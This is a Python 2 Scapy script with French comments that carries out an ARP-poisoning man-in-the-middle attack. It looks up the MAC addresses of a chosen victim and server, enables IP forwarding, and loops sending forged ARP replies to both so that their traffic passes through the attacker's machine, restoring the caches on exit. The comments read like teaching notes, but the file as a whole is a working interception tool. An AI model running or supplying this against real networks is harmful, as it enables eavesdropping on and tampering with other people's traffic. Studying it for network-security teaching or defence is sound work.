

import sys
import os
import time
from scapy.all import *



#fonction permettant de recuperer l adresse MAC a partir d une IP
def getMac(ip,interface):
	# srp(pkts,filter=None,iface=None,timeout=2,inter=0,verbose=None,chainCC=0,retry=0,multi=0,iface_hint=None)
	# srp envoie et recoit un message au nivau 2 (MAC). srp1 idem mais ne revoie que la 1ere reponse.
	# inter time in seconds to wait between each packet sent.
	answer, unanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=interface)
	for envoi,reponse in answer:
		return reponse.sprintf("%Ether.src%")

# Fonction au coeur de cette attaque Man In The Middle: 
# Elle envoie un paquet arp au client et au serveur pour perturber leur cache arp
# Cette attaque est appelee "usurpation d'ARP" ("ARP poisonning") ou "empoisonnement ARP"("ARP spoofing")
# remarque: d'autres type d'ttaque peuvent realiser une attaque Man In The Middle.
def attaque(ipVictime,ipServeur,macVictime, macServeur, interface):
	# envoie un paquet  op=2 signifie que c'est une reponse . 
	# envoie un paquet a la victime pour lui faire croire que ipServeur a notre adresse MAC  . 
	# comme on ne stipule pas hwsrc il prend l'adresse MAC de ce poste de pirate. 
	send(ARP(op=2, pdst=ipVictime, psrc=ipServeur, hwdst=macVictime))
	# puis envoie un paquet au serveur pour lui faire croire que ipVictime a notre adresse MAC  . 
    	send(ARP(op=2, pdst=ipServeur, psrc=ipVictime, hwdst=macServeur))
    	# je pense que l'on peut aussi utiliser   arpcachepoison (ipServeur,ipVictime , interval=60)

#Fonction pour activer ou desactiver le routage
def  setIpForwarding(vraiOuFaux):
	if (vraiOuFaux==True):
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	else:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
	

#fonction appelee apres l'attaque pour repositionner les cache ARP de la victime et du serveur comme avant ( sans ARP poisonning)
def apresAttaque(ipVictime,ipServeur,macVictime, macServeur, interface):
	print ("Ares attaque: remise a neuf des caches arp de la victime et du serveur")

	#Envoie une requete ARP au serveur en se faisant passer pour l IP de la victime avec l adresse MAC de la victime ( la bonne ) 
	send(ARP(op=2, pdst=ipServeur, psrc=ipVictime, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=macVictime), count=5)
 
	#Envoie une requete ARP a la victime en se faisant passer pour l IP du serveur avec l adresse MAC du serveur ( la bonne ) 
	send(ARP(op=2, pdst=ipVictime, psrc=ipServeur, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=macServeur), count=5)

	#desactive le routage 
	setIpForwarding(False)
	# On pourrait aussi utiliser la commande systeme:  os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")	



try:
	#interface ="eth0"
	interface = raw_input("nom interface eth0 , eth1 ... : ")
	ipVictime = raw_input("IP du client a attaquer : ")
	ipServeur = raw_input("IP du serveur en communication avec le client : ")

	#Retrouver les vraies adresses MAC de la victime et du serveur
	macVictime=getMac(ipVictime,interface)
	macServeur=getMac(ipServeur,interface)
	

	#Active le routage  
   	setIpForwarding(True)



except Exception, e:
	#desactive le routage au cas ou il serait active 
   	setIpForwarding(False)
   	print ("Erreur lor de la recuperation des adresse MAC ou de l'activation du routage")
   	print (e)
   	sys.exit(1)


print ("MAC victime "+macVictime+" MAC serveur "+macServeur)

while(True):
	try:
		attaque(ipVictime,ipServeur,macVictime, macServeur, interface)
		time.sleep(1.5)
	except KeyboardInterrupt:
		apresAttaque(ipVictime,ipServeur,macVictime, macServeur, interface)
		try:
			sys.exit(1)
			break  # on sort du while true si on n'est pas encore sorti du programme !
		except SystemExit:
			os._exit(1)


		


